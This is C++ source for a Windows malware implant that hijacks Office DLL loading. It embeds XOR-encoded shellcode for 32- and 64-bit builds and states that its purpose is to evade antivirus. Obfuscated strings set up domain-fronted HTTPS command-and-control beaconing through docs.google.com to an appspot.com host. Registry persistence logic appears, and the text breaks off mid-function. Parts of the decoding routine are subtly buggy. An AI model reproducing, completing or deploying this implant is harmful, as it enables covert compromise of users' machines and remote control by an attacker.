// Office DLL Hijacking
// Multi-byte character set 
// using static libraries
// XORandDrop and check calling process to bypass AV
// const char *hostname = "192.168.102.129";
// addr_list.sin_port = htons(443);
// XORandDrop(bits, 'J', d); 

#include "stdafx.h"
#include <string>
#include <atlstr.h>
#include <thread>
#include <tlhelp32.h>
#include <fstream>
#include <ws2tcpip.h>
#include <WinHTTP.h>
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Winhttp.lib")

std::string office1 = "Of";
std::string office2 = "f";
typedef BOOL(WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
LPFN_ISWOW64PROCESS fnIsWow64Process;
//unsigned char key[] = {"J"};
unsigned long shsize = 2048;

//For Debuging
PROCESS_INFORMATION processInformation = { 0 };
STARTUPINFO startupInfo = { 0 };

#ifdef _WIN64
unsigned char bits[] = "\xf1\xb6\xf3\x02\x3a\xc9\x94\xae\x2e\xba\x8c\xa2\x0e\x82\x44\x4a\x0e\x4a\x44\x4a\x4f\x0b\x54\x1b\x5f\x0b\x45\x1a\x5d\x18\x46\x1b\x5a\x1c\x58\x02\x23\x7b\xbb\x98\x94\x2f\x96\x02\x57\xc1\x4f\x18\x65\x2a\x67\x02\xa6\xc1\xbe\x18\xec\x52\xee\x02\x2f\xc1\x37\x18\x5d\x6a\x5f\x02\x9e\xc1\xa6\x38\xbc\x1a\xbe\x02\xfb\x45\x06\xfd\x06\x00\x06\x00\x01\x07\x7a\x7b\xf9\x83\xfb\x02\x80\x7b\x0a\x8a\xec\xe6\x9a\x76\xb1\x2b\x87\x36\xcf\x48\xa9\x66\xc3\x6a\xc8\x0b\x43\x8b\xc0\x83\x87\x47\x8c\x0b\xc7\x4b\x4c\x8b\xe4\xa8\x43\xa7\x5b\x18\x50\x0b\x4b\x1b\x49\x02\x88\xc1\x90\x18\xfa\x6a\x3b\xc1\x33\x08\x45\x76\x47\x02\x0c\x4b\x96\x9a\xba\x2c\x71\xcb\x43\x32\x11\x52\x50\x41\x18\x48\x27\x3f\x1f\x38\xde\xc1\x14\xca\xd6\xc2\x9c\x4a\xd6\x4a\x9c\x4a\x9e\x02\x51\xcf\xdb\x8a\xe5\x3e\xc8\x2d\xca\x02\x81\x4b\x1b\x9a\x01\x1a\xc0\xc1\xc2\x02\x90\x52\x9e\x0e\x5f\xc1\x55\x0a\x3f\x6a\x3c\x03\x77\x4b\xed\x9a\x44\xa9\x58\x1c\x5a\x02\xef\xb5\x6c\x83\x67\x0b\xa6\xc1\xd8\x7e\x1a\xc2\x18\x02\x53\x4b\xcf\x9c\xc8\x07\xb3\x7b\x30\x83\x32\x02\x49\x7b\xc3\x8a\x25\xe6\x2e\x0b\xa5\x8b\x26\x83\x61\x47\x6a\x0b\x21\x4b\xaa\x8b\xd8\x72\x72\xaa\x4d\x3f\xf6\xbb\xf0\x06\xb9\x49\xbf\x06\xd1\x6e\x93\x42\x9c\x0f\xef\x73\x74\x9b\x4b\x3f\xd9\x92\xcb\x12\xc5\x0e\x04\xc1\x0e\x0a\x60\x6e\x63\x03\x28\x4b\xb2\x9a\x9e\x2c\x95\x0b\x54\xc1\x12\x46\x10\x02\x1e\x0e\xdf\xc1\xd5\x0a\x83\x56\x80\x03\xcb\x4b\x51\x9a\x5a\x0b\x9b\xc1\xd5\x4e\x17\xc2\x15\x02\x5e\x4b\xc4\x9a\xcf\x0b\xdd\x12\xd6\x0b\xc4\x12\xd0\x14\xc3\x13\xd3\x10\xd8\x0b\xca\x12\xc1\x0b\xd2\x13\xd9\x0b\xc9\x10\xcb\x02\x02\xc9\xa4\xa6\xce\x6a\xc5\x0b\xdd\x18\x68\xb5\xc2\xaa\xd0\x12\xdb\x0b\xc8\x13\xd8\x10\xda\x02\x1b\xc1\x43\x58\xe0\xa3\xe5\x05\x50\xb5\xe5\xb5\x50\xb5\x47\x17\x67\x20\x2d\x4a\x2e\x03\xda\xf4\xe7\x3d\xc4\x23\xe0\x24\xc3\x23\xe7\x24\xc8\x2f\xf6\x3e\xbc\x4a\xb7\x0b\xab\x1c\xa8\x03\x6b\xc3\xc7\xac\xc1\x06\x02\xc3\xb9\xbb\xb2\x0b\x42\xf0\x44\x06\x79\x3d\x15\x6c\x58\x4d\xed\xb5\x72\x9f\x70\x02\x0b\x7b\x88\x83\x8a\x02\xf1\x7b\x69\x98\x6e\x07\x15\x7b\x9f\x8a\x98\x07\xe3\x7b\x60\x83\x6b\x0b\x71\x1a\x7a\x0b\x60\x1a\x6b\x0b\x9b\xf0\xeb\x70\xf7\x1c\xc4\x33\x29\xed\x9c\xb5\x03\x9f\xa0\xa3\x79\xd9\x33\x4a\x79\x4a\x33\x4a\x23\x10\x21\x02\xe2\xc3\x69\x8b\x62\x0b\x90\xf2\x61\xf1\x2a\x4b\x60\x4a\x2a\x4a\x2d\x07\x56\x7b\xd5\x83\xde\x0b\xc5\x1b\xce\x0b\xd5\x1b\xf5\x20\xbc\x49\xb7\x0b\xac\x1b\xa7\x0b\x57\xf0\x4a\x1d\x89\xc3\x5c\xd5\xd0\x8c\x65\xb5\xfa\x9f\x5b\xa1\x68\x33\x79\x11\x7b\x02\xb8\xc3\x33\x8b\x31\x02\x4a\x7b\xd2\x98\xd1\x03\x12\xc3\x80\x92\x87\x07\xfc\x7b\x7f\x83\x67\x18\x45\x22\x0f\x4a\x77\x78\x9d\xea\x53\xce\x4b\x18\x53\x18\x58\x0b\xa8\xf0\x09\xa1\x16\x1f\x72\x64\x03\x71\xb6\xb5\x29\x9f\x2b\x02\xe8\xc3\x64\x8c\x66\x02\xaf\xc9\x26\x89\x3c\x1a\x1c\x20\x5c\x40\x49\x15\x4b\x02\x88\xc3\x33\xbb\xc3\xf0\x96\x55\xdc\x4a\x96\x4a\xdc\x4a\xfc\x20\xb6\x4a\x94\x22\x5e\xca\x27\x79\x6d\x4a\x27\x4a\x24\x03\xe7\xc3\x4d\xaa\x46\x0b\xb5\xf3\xfb\x4e\xb1\x4a\xfb\x4a\xb1\x4a\xba\x0b\x4a\xf0\x75\x3f\x79\x0c\xad\xd4\x61\xcc\xd4\xb5\x4b\x9f\x49\x02\x8a\xc3\x31\xbb\x33\x02\xf0\xc3\x60\x90\x63\x03\xee\x8d\x64\x8a\xd1\xb5\x64\xb5\xd1\xb5\x64\xb5\x63\x07\x18\x7b\x9b\x83\x83\x18\x9b\x18\x90\x0b\x60\xf0\x07\x67\x4b\x4c\x19\x52\x28\x31\x9d\xb5\x02\x9f\xcd\xcf\x47\x8a\x02\x45\xcd\xcf\x1a\xd7\x51\x4b\x1b\x4a\x51\x4a\x53\x02\xe6\xb5\x63\x85\x26\x45\xe8\xce\x2e\xc6\x65\x4b\x2f\x4a\x65\x4a\xc4\xa1\x3d\xf9\x9e\xa3\x30\xae\x7b\x4b\x31\x4a\x7b\x4a\xd9\xa2\x11\xc8\xa4\xb5\x11\xb5\xa4\xb5\xc1\x65\xc7\x06\xd9\x1e\xf5\x2c\xe8\x1d\xa2\x4a\xbe\x1c\x65\xdb\x07\x62\x4f\x48\x2d\x62\xa7\x8a\xd4\x73\x6a\xbe\xc4\xae\x8e\x4a\x49\xc7\x30\x79\x4d\x7d\xfd\xb0\x45\xb8\x2d\x68\xd9\xf4\xaf\x76\x4e\xe1\x86\xc8\x9a\x1c\x9e\x04\x17\x89\x0a\x1d\x11\x1b\xc3\xd2\xdc\x1f\xcb\x17\x1a\xd1\x10\x0a\x70\x60\x48\x38\x9b\xd3\xde\x45\x3a\xe4\x28\x12\xd0\xf8\x83\x53\x46\xc5\x29\x6f\x6f\x46\x7a\x15\xf6\x8c\x60\x96\xba\xda\xc3\x79\xae\x6d\x11\xbf\x84\x95\xb8\x3c\x35\x8d\x59\x6c\x81\xd8\x29\xa8\x0c\x25\xaf\xa3\x21\x8e\x6d\x4c\xee\x83\x4d\xa3\x8f\xc2\x33\xbc\xc3\xf0\xc9\x0a\x8f\x46\x95\x1a\x2a\xbf\x30\x1a\xd5\xe5\xe7\x32\xec\x0b\x53\xbf\xc8\x9b\x82\x4a\x80\x02\xa5\x25\x9c\x39\xa2\x3e\xd2\x70\xb8\x6a\x84\x3c\xa7\x23\x9d\x3a\xb2\x2f\x8a\x38\xa6\x2c\x85\x23\xbc\x39\x9e\x22\xf9\x67\x82\x7b\xf1\x73\x8d\x7c\xf0\x7d\x8b\x7b\xf5\x7e\x91\x64\xba\x2b\x80\x3a\xba\x3a\x83\x39\xb9\x3a\x9c\x25\xa2\x3e\xc6\x64\xef\x29\xca\x25\xed\x27\xaa\x47\xea\x40\xf5\x1f\xcc\x39\xe3\x2f\xdb\x38\xbc\x67\xb7\x0b\x9a\x2d\xb5\x2f\x91\x24\xaf\x3e\xdf\x70\xb5\x6a\xb2\x07\x97\x25\xa7\x30\x84\x23\xa2\x26\x84\x26\xaf\x2b\xca\x65\xb5\x7f\xd1\x64\xab\x7a\xc1\x6a\xa3\x62\xbe\x1d\x9d\x23\xb9\x24\x97\x2e\xb2\x25\x8f\x3d\xb6\x39\xdc\x6a\xd8\x04\xc6\x1e\xac\x6a\xd0\x7c\xb4\x64\xcf\x7b\xbe\x71\xd4\x6a\xc9\x1d\xcc\x05\xd1\x1d\xad\x7c\xd3\x7e\xa2\x71\xc8\x6a\xd6\x1e\xee\x38\xcd\x23\xe3\x2e\xcc\x2f\xe8\x24\xd6\x3e\xb3\x65\xce\x7d\xaa\x64\xd0\x7a\xa1\x71\xcb\x6a\xf3\x38\xcf\x3c\xbf\x70\xc4\x7b\xbf\x7b\xdb\x64\xa1\x7a\xc2\x63\xa8\x6a\x8e\x26\xad\x23\x8c\x21\xa3\x2f\xc9\x6a\xc4\x0d\xeb\x2f\xc2\x29\xe3\x21\xc6\x25\x81\x47\xc1\x40\x8b\x4a\x3a\xb1\x0e\x34\xa7\xa9\x9c\x3b\x56\xca\x2f\x79\x0f\x20\xfa\xf5\xc1\x3b\x0f\xce\xe7\xe8\xfd\x1a\xcc\x31\xee\x22\x2d\xc3\xdd\xf0\x93\x4e\xa7\x34\x6b\xcc\x33\x58\x5c\x6f\x16\x4a\x88\x9e\xfd\x75\xe3\x1e\x04\xe7\xc0\xc4\xc2\x02\x65\xa7\x49\x2c\x05\x4c\xee\xeb\x85\x6b\x12\x97\x82\x90\xce\x4c\xba\x74\x61\xdb\x92\xf3\x20\xb2\x6d\x4d\x79\x14\x6f\x16\x21\x4e\x73\x52\x29\x5a\x8a\xa3\x5d\xd7\xf8\xa5\xac\x54\x2b\x87\x0a\x21\x0f\x05\xb6\xb9\xbd\x0b\x78\xc5\xaf\xd7\x70\xdf\x27\x57\xab\x8c\x2e\x85\x51\x7f\x58\x09\x2c\x74\xed\xc1\x85\x68\x36\xb3\x2f\x19\x21\x0e\x1e\x3f\x1b\x05\x5d\x46\x88\xd5\x73\xfb\xea\x99\xda\x30\xa6\x7c\x6f\xc9\x40\x2f\xef\xaf\xe4\x0b\xc7\x23\xc7\x00\xd5\x12\xf5\x20\xa3\x56\x74\xd7\x0b\x7f\xec\xe7\xc3\x2f\xdd\x1e\x7d\xa0\xa3\xde\xf9\x5a\x44\xbd\x69\x2d\xc0\xa9\x64\xa4\x6e\x0a\xbf\xd1\xad\x12\x86\x2b\x8f\x09\x07\x88\xda\xdd\x94\x4e\x50\xc4\x15\x45\xd8\xcd\xf0\x28\x88\x78\x86\x0e\xd1\x57\x21\xf0\x29\x08\xac\x85\x42\xee\x1f\x5d\x42\x5d\xb8\xfa\xdd\x65\xce\x13\x4c\x82\xa4\xe8\xcc\x68\xd6\x1a\x90\x46\x63\xf3\x73\x10\x7f\x0c\x0a\x75\x4e\x44\xe5\xab\xc4\x21\x03\xc7\x93\x90\xe3\x70\x91\x72\x72\xe3\x6a\x18\x9f\xf5\x13\x8c\x0e\x1d\x37\x39\x01\x36\x41\x40\xe7\xa6\xf6\x11\xd7\x21\x0d\xda\x8a\x87\xa6\x2c\x9e\x38\xcb\x55\x60\xab\x5f\x3f\x95\xca\xd4\x41\x5e\x8a\x72\x2c\x20\x52\x74\x54\x9f\xeb\x01\x9e\x0d\x0c\x95\x98\x11\x84\x29\x38\x27\x0e\x14\x33\x2b\x3f\xb9\x92\x17\xae\x0c\x1b\x33\x3f\xa7\x94\xd4\x73\x63\xb7\x11\x72\x70\x61\x50\x20\x7b\x2b\xb9\xc2\xc5\x7c\x8f\x4a\x84\x0b\x70\xf4\xca\xba\x35\xff\xdd\xe8\xc1\x1c\x74\xb5\xeb\x9f\xe9\x02\x92\x7b\x11\x83\xe1\xf0\xab\x4a\xe1\x4a\xeb\x0a\xa1\x4a\xaa\x0b\x58\xf2\x12\x4a\x48\x5a\x02\x4a\x48\x4a\x43\x0b\xb0\xf3\xba\x0a\xf0\x4a\xba\x4a\xf0\x4a\xfb\x0b\x0b\xf0\x19\x12\xf7\xee\xee\x19\x41\xaf\xf4\xb5\x6b\x9f\x69\x02\xb0\xd9\xa9\x19\xb0\x19\xb2\x02\x71\xc3\xdc\xad\xde\x02\x1d\xc3\xa6\xbb\xa4\x02\x67\xc3\xf7\x90\xfc\x0b\x0e\xf2\x44\x4a\x2e\x6a\x64\x4a\x2e\x4a\x2d\x03\xee\xc3\x5d\xb3\x56\x0b\xa6\xf0\xfe\x58\x22\xdc\xe1\xc3\x49\xa8\xfc\xb5\x63\x9f\x61\x02\xa8\xc9\x26\x8e\x4c\x6a\x83\xcf\x09\x8a\x37\x3e\xcb\xfc\xe7\x2c\x26\xc1\x6b\x4d\x69\x02\x22\x4b\xab\x89\x64\xcf\xee\x8a\xd1\x3f\x4c\x9d\x5e\x12\x4c\x12\x5e\x12\x5c\x02\x13\x4f\x59\x4a\x13\x4a\x59\x4a\x13\x4a\x09\x1a\x80\x89\x22\xa2\x17\x35\xa0\xb7\x15\xb5\xa0\xb5\x8e\x2e\xab\x25\x82\x29\xbb\x39\xdf\x64\xf2\x2d\xd7\x25\xf2\x25\xdf\x2d\xf9\x26\xd6\x2f\xb2\x64\x9b\x29\xbe\x25\x99\x27\xd3\x4a\xae\x7d\x63\xcd\x11\x72\x94\x85";
#else
unsigned char bits[] = "\xf1\xb6\x53\xa2\x90\xc3\xda\x4a\x90\x4a\xda\x4a\xf0\x2a\x33\xc3\x9c\xaf\xe7\x7b\x7f\x98\x51\x2e\x90\xc1\x88\x18\xf2\x7a\x33\xc1\x2b\x18\x6d\x46\xac\xc1\xb4\x18\xea\x5e\x2b\xc1\x13\x38\x71\x62\x34\x45\xc9\xfd\xc9\x00\xa5\x6c\xde\x7b\x6b\xb5\x10\x7b\x9a\x8a\x7c\xe6\x0a\x76\x21\x2b\x17\x36\x5f\x48\x39\x66\x53\x6a\xd8\x8b\x5d\x85\x1a\x47\x51\x4b\xdc\x8d\x74\xa8\xce\xba\xd6\x18\xcb\x1d\x0a\xc1\x12\x18\x48\x5a\x89\xc1\x81\x08\xf7\x76\xbc\x4b\x26\x9a\xe7\xc1\xed\x0a\xdf\x32\x10\xcf\x9a\x8a\xa4\x3e\xa4\x00\xef\x4b\x75\x9a\x6f\x1a\xae\xc1\xac\x02\xfe\x52\x3f\xc1\x2d\x12\x47\x6a\x0c\x4b\x95\x99\x3c\xa9\x4a\x76\x49\x03\x88\xc1\xf6\x7e\x37\xc1\x7c\x4b\xe0\x9c\x9b\x7b\x2e\xb5\x55\x7b\xdf\x8a\x39\xe6\xb2\x8b\x37\x85\x70\x47\x3b\x4b\xb6\x8d\xc4\x72\x6e\xaa\x51\x3f\xef\xbe\xa6\x49\x91\x37\x23\xb2\x52\x71\x65\x37\x0b\x6e\x34\x3f\x9c\xa8\x8e\x12\x4f\xc1\x5d\x12\x33\x6e\x78\x4b\xe1\x99\xcd\x2c\x0c\xc1\x4a\x46\x4b\x01\x8a\xc1\x98\x12\xce\x56\x85\x4b\x1c\x99\xdd\xc1\x93\x4e\x52\xc1\x19\x4b\x83\x9a\x40\xc3\x4e\x0e\x20\x6e\x4e\x6e\x5f\x11\x4e\x11\x65\x2b\x76\x13\x66\x10\x7d\x1b\xc8\xb5\x62\xaa\x70\x12\x65\x15\x75\x10\xb4\xc1\xec\x58\x4d\xa1\x81\xcc\x96\x17\xb4\x22\x90\x24\xbf\x2f\x81\x3e\xcb\x4a\xe9\x22\xd4\x3d\xf7\x23\xd3\x24\xf0\x23\xee\x1e\xcc\x22\xca\x06\xf7\x3d\x9b\x6c\xd6\x4d\x63\xb5\xfc\x9f\x5e\xa2\x14\x4a\x5e\x4a\x14\x4a\x5e\x4a\x25\x7b\x90\xb5\x8d\x1d\x90\x1d\x8d\x1d\x90\x1d\x8d\x1d\xaf\x22\xdf\x70\xc3\x1c\xf0\x33\x1d\xed\xa8\xb5\x37\x9f\x94\xa3\x7a\xee\x30\x4a\x7a\x4a\x30\x4a\x21\x11\x5a\x7b\xd9\x83\xc2\x1b\xd9\x1b\xf9\x20\xb0\x49\xab\x1b\xb0\x1b\x92\x22\x63\xf1\x28\x4b\x62\x4a\x28\x4a\x31\x19\x2b\x1a\x09\x22\x14\x1d\xd7\xc3\x02\xd5\x8e\x8c\x3b\xb5\xa4\x9f\xbe\x1a\x1d\xa3\xdb\xc6\x91\x4a\xdb\x4a\x91\x4a\x80\x11\xfb\x7b\x63\x98\x7b\x18\x59\x22\x13\x4a\x6b\x78\x81\xea\x4f\xce\x57\x18\x4f\x18\x57\x18\x4e\x19\x56\x18\x4c\x1a\x6e\x22\xcf\xa1\xd0\x1f\xb4\x64\xc5\x71\x70\xb5\xef\x9f\x2c\xc3\xa0\x8c\x69\xc9\xe0\x89\xfa\x1a\xd8\x22\x12\xca\x6b\x79\x21\x4a\x6b\x4a\xa8\xc3\x02\xaa\x22\x20\x6c\x4e\x76\x1a\x56\x20\x03\x55\x1f\x1c\x3d\x22\x02\x3f\x0e\x0c\xda\xd4\x16\xcc\xa3\xb5\x3c\x9f\x29\x15\x52\x7b\xe7\xb5\xfa\x1d\xe7\x1d\xc7\x20\x72\xb5\x6b\x19\x77\x1c\x55\x22\x32\x67\x7e\x4c\x2c\x52\x1d\x31\xa8\xb5\x37\x9f\xf8\xcf\x72\x8a\x37\x45\xf9\xce\x79\x80\x32\x4b\x78\x4a\x32\x4a\x49\x7b\xfc\xb5\x33\xcf\x8f\xbc\xb1\x3e\xff\x4e\x3c\xc3\x8f\xb3\x2e\xa1\x6d\x43\x4f\x22\xaf\xe0\x20\x8f\x88\xa8\x9f\x17\x2a\xb5\xb5\x9f\x76\xc3\xfd\x8b\xdf\x22\xd0\x0f\xbb\x6b\xaf\x14\xd4\x7b\x61\xb5\xfe\x9f\x85\x7b\x30\xb5\x2d\x1d\x0d\x20\x40\x4d\x5b\x1b\x47\x1c\x5d\x1a\x7f\x22\x82\xfd\x9f\x1d\x35\xaa\x74\x41\xc1\xb5\x5e\x9f\xab\xf5\xe1\x4a\x84\x65\xce\x4a\x84\x4a\xf7\x73\x7a\x8d\x45\x3f\x08\x4d\x1a\x12\x00\x1a\xa3\xa3\x92\x31\x27\xb5\x92\xb5\x27\xb5\x5c\x7b\xe9\xb5\x4a\xa3\x91\xdb\xda\x4b\x90\x4a\xda\x4a\x79\xa3\xfa\x83\xb1\x4b\xfb\x4a\xb1\x4a\x13\xa2\x36\x25\x83\xb5\x36\xb5\x83\xb5\xe6\x65\xe2\x04\xe0\x02\xc4\x24\xd6\x12\x9c\x4a\x78\xe4\x68\x10\x5b\x33\x5b\x00\x97\xcc\x6b\xfc\x07\x6c\x46\x41\xbc\xfa\x05\xb9\x3f\x3a\xb3\x8c\xd1\x62\x7a\xab\xa7\xdd\x69\xce\xd5\xbc\xdb\x0e\x21\xfa\xed\xcc\x6e\x83\x8d\xe3\x1c\x91\x53\x4f\x62\x31\xf4\x96\xb6\x42\x33\x85\x13\x20\xa1\xb2\xd7\x76\x8a\x5d\x39\xb3\x6c\x55\x7b\x17\x8f\xf4\xcb\x44\x7a\xb1\xb2\xc8\xa3\x11\xe9\x4a\x95\x7c\x49\xdc\x1e\x57\xc3\xdd\xfc\x3f\x09\xf5\x8b\x82\xf6\x7d\x57\xa1\x0c\x5b\xaf\xa3\xb9\x16\xff\x46\xee\x11\x99\x77\x78\xe1\x49\x31\x2d\x64\x67\x4a\xf9\x9e\xb3\x4a\x6c\xdf\xd4\xb8\x52\x86\x65\x37\x92\xf7\x3a\xa8\xa1\x9b\x7d\xdc\xf3\x8e\x1f\xec\x50\x4f\x1a\x4a\x18\x02\x3d\x25\x04\x39\x3a\x3e\x4a\x70\x20\x6a\x1c\x3c\x3f\x23\x05\x3a\x2a\x2f\x12\x38\x3e\x2c\x1d\x23\x24\x39\x06\x22\x61\x67\x1a\x7b\x69\x73\x15\x7c\x68\x7d\x13\x7b\x6d\x7e\x09\x64\x22\x2b\x18\x3a\x22\x3a\x1b\x39\x21\x3a\x04\x25\x3a\x3e\x5e\x64\x77\x29\x52\x25\x75\x27\x32\x47\x72\x40\x6d\x1f\x54\x39\x7b\x2f\x43\x38\x24\x67\x2f\x0b\x02\x2d\x2d\x2f\x09\x24\x37\x3e\x47\x70\x2d\x6a\x2a\x07\x0f\x25\x3f\x30\x1c\x23\x3a\x26\x1c\x26\x37\x2b\x52\x65\x2d\x7f\x49\x64\x33\x7a\x59\x6a\x3b\x62\x26\x1d\x05\x23\x21\x24\x0f\x2e\x2a\x25\x17\x3d\x2e\x39\x44\x6a\x40\x04\x5e\x1e\x34\x6a\x48\x7c\x2c\x64\x57\x7b\x26\x71\x4c\x6a\x51\x1d\x54\x05\x49\x1d\x35\x7c\x4b\x7e\x3a\x71\x50\x6a\x4e\x1e\x76\x38\x55\x23\x7b\x2e\x54\x2f\x70\x24\x4e\x3e\x2b\x65\x56\x7d\x32\x64\x48\x7a\x39\x71\x53\x6a\x6b\x38\x57\x3c\x27\x70\x5c\x7b\x27\x7b\x43\x64\x39\x7a\x5a\x63\x30\x6a\x16\x26\x35\x23\x14\x21\x3b\x2f\x51\x6a\x5c\x0d\x73\x2f\x5a\x29\x7b\x21\x5e\x25\x19\x47\x59\x40\x13\x4a\x69\x7a\x7a\x13\x5c\x26\x95\xc9\xb9\x2c\x66\xdf\x9f\xf9\x00\x9f\xb4\xb4\xd5\x61\x4c\x99\x9a\xd6\x70\xea\x85\xf5\xdd\x58\x97\x4a\xd7\x40\xa8\x7f\x44\xec\xca\x8e\x87\x4d\xb7\x30\x1a\xad\xdb\xc1\xf4\x2f\x4d\xb9\x45\x08\x6a\x2f\x69\x03\xbd\xd4\xe9\x54\xbe\x57\xdf\x61\x21\xfe\x73\x52\xa0\xd3\xb3\x13\xb2\x01\x18\xaa\x8b\x93\x9b\x10\xc2\x59\x87\x45\xc4\x43\xa2\x66\x2e\x8c\xfe\xd0\xdc\x22\x1f\xc3\xe7\xf8\x07\xe0\x67\x60\x70\x17\x4a\x3a\x90\xda\xdd\x4d\x85\x58\x83\x06\xd9\x5a\x51\x88\x4b\x1a\xe0\xab\xe9\x09\xa2\x4b\xd7\x75\xc7\x10\xbf\x78\xaf\x10\x13\xbc\xf6\xe5\xed\x1b\x18\xf5\x53\x4b\x0c\x5f\x17\x1b\x5d\x4a\xf5\xa8\xbe\x4b\xa3\x1d\xab\x08\xcf\x64\x89\x46\xc6\x4f\x8d\x4b\x8d\x00\x70\xfd\x61\x11\x3f\x5e\x6a\x55\xbc\xd6\xb6\x0a\xa4\x12\x43\xe7\x97\xd4\x6e\xf9\xfc\x92\x8b\x77\x0a\x81\xc8\xc2\xfd\x35\x49\xb4\x95\xdc\xf6\x63\x93\x65\x10\x83\x4e\x5e\x0f\x41\x0c\x03\x3b\x37\xbc\x87\x13\xaf\x74\x67\xc3\xb7\x47\x84\xed\xaa\xef\x02\xf3\x1c\x64\x97\xeb\x8f\xa8\x43\x25\x8d\x07\x22\x4b\x4c\x7d\x36\x3d\x40\x2d\x10\x78\x55\xff\x87\xc7\x38\x75\xb2\x4a\x3f\x8b\xc1\x6e\xe5\x52\x3c\x8c\xde\x1d\x91\x5c\x41\x55\x09\x51\x04\x84\xd5\x46\xc2\x7c\x3a\x9b\xe7\x09\x92\x42\x4b\x93\xd1\xec\x7f\x98\x74\xfd\x65\xa8\x55\x53\xfb\x47\x14\x75\x32\x71\x04\x8d\xfc\x26\xab\xc9\xef\xbd\x74\x34\x89\xcb\xff\x05\xce\xe6\xe3\x00\xe6\xca\xca\x6d\xa7\xf7\x9a\x7b\x8c\x07\x7c\xc2\xc5\x44\x86\x8f\xcb\x1d\x92\x0f\x12\xc8\xc7\xce\x06\x8c\x42\x09\x85\x7c\x75\xcb\xb7\xd3\x18\x8c\x5f\x13\x9f\x74\x67\xb8\xcc\xf2\x4a\xd0\x22\x6a\xba\x95\xff\x7d\xe8\x61\x1c\xd4\xb5\x4b\x9f\x6b\x20\x61\x0a\x43\x22\x09\x4a\x53\x5a\x19\x4a\x53\x4a\x71\x22\x3b\x4a\x71\x4a\x7b\x0a\x31\x4a\x2c\x1d\x0e\x22\x1c\x12\xf2\xee\xeb\x19\x44\xaf\xf1\xb5\x6e\x9f\xb7\xd9\x44\xf3\x0e\x4a\x44\x4a\x0e\x4a\x44\x4a\x0f\x4b\x9c\x93\x87\x1b\x9e\x19\x5d\xc3\xf0\xad\xed\x1d\xcf\x22\x85\x4a\xef\x6a\xa5\x4a\xef\x4a\xf6\x19\xea\x1c\xc8\x22\x90\x58\x4c\xdc\x8f\xc3\x27\xa8\x92\xb5\x0d\x9f\xc2\xcf\x48\x8a\x76\x3e\xfa\x8c\x3b\xc1\x76\x4d\x3d\x4b\xb4\x89\x7b\xcf\xf1\x8a\xce\x3f\x61\xaf\x73\x12\xfa\x89\x58\xa2\x9b\xc3\x2c\xb7\x99\xb5\x2c\xb5\x02\x2e\x27\x25\x0e\x29\x37\x39\x53\x64\x7e\x2d\x5b\x25\x7e\x25\x53\x2d\x75\x26\x5a\x2f\x3e\x64\x17\x29\x32\x25\x15\x27\x5f\x4a\x22\x7d\xef\xcd\x9d\x72\x18\x85";
#endif

const int size = sizeof bits;

unsigned char* strXOR(const char* e)
{
	char k = 'J';
	unsigned char *d = (unsigned char*)malloc(sizeof(e));
	for (int i = 1; i < size; i++)
	{
		d[i] = e[i] ^ k;
	}
	return d;
}

std::string program((char*)strXOR("\x05\x2c\x2c\x23\x29\x2f"));

/* hand-rolled bzero from metasploit*/
void bzero_cust(void *p, size_t l)
{
	BYTE *q = (BYTE *)p;
	size_t x = 0;
	for (x = 0; x < l; x++)
		*(q++) = 0x00;
}



/*Tests if the server is up and if the server has been unreachable for a set period of time
If it is over the set period of time, the registry key is deleted*/
bool uptime()
{
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	//LPSTR pszOutBuffer;
	BOOL  bResults = FALSE, httpResponse = NULL;
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;
	DWORD dwStatusCode = 0;
	DWORD dwSize2 = sizeof(DWORD);
	bool open = true;

	hSession = WinHttpOpen((LPCWSTR)(LPCWSTR)strXOR("\x07\x25\x30\x23\x26\x26\x2b\x65\x7f\x64\x7a\x6a\x62\x1d\x23\x24\x2e\x25\x3d\x39\x6a\x04\x1e\x6a\x7b\x7a\x64\x7a\x71\x6a\x1d\x23\x24\x7c\x7e\x71\x6a\x32\x7c\x7e\x71\x6a\x38\x3c\x70\x7f\x72\x64\x7a\x63\x6a\x0d\x2f\x29\x21\x25\x65\x78\x7a\x7b\x7a\x7a\x7b\x7a\x7b\x6a\x0c\x23\x38\x2f\x2c\x25\x32\x65\x7f\x72\x64\x7a"),
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);
	if (hSession)
		hConnect = WinHttpConnect(hSession, (LPCWSTR)(LPCWSTR)strXOR("\x2e\x25\x29\x39\x64\x2d\x25\x25\x2d\x26\x2f\x64\x29\x25\x27"),
			INTERNET_DEFAULT_HTTPS_PORT, 0);
	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"GET", NULL,
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			WINHTTP_FLAG_SECURE);
	if (hRequest)
		BOOL httpResult = WinHttpAddRequestHeaders(
			hRequest,
			(LPCWSTR)(LPCWSTR)strXOR("\x02\x25\x39\x3e\x70\x6a\x3c\x23\x3a\x2f\x38\x2c\x23\x39\x22\x67\x7b\x73\x7c\x7d\x7b\x7e\x64\x2b\x3a\x3a\x39\x3a\x25\x3e\x64\x29\x25\x27"),
			-1L,
			0);
	if (hRequest)
		bResults = WinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS, 0,
			WINHTTP_NO_REQUEST_DATA, 0,
			0, 0);
	if (bResults)
		httpResponse = WinHttpReceiveResponse(hRequest, NULL);
	if (httpResponse)
		bResults = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwStatusCode, &dwSize2, NULL);
	if (dwStatusCode == 502)
		open = false;
	else
		open = true;

	//Log connection failure 
	if (!open)
	{
		time_t CurrentDate, Lastfailue;
		CurrentDate = time(0);
		time_t seconds = 0, minutes = 0, hours = 0, days = 0, months = 0;
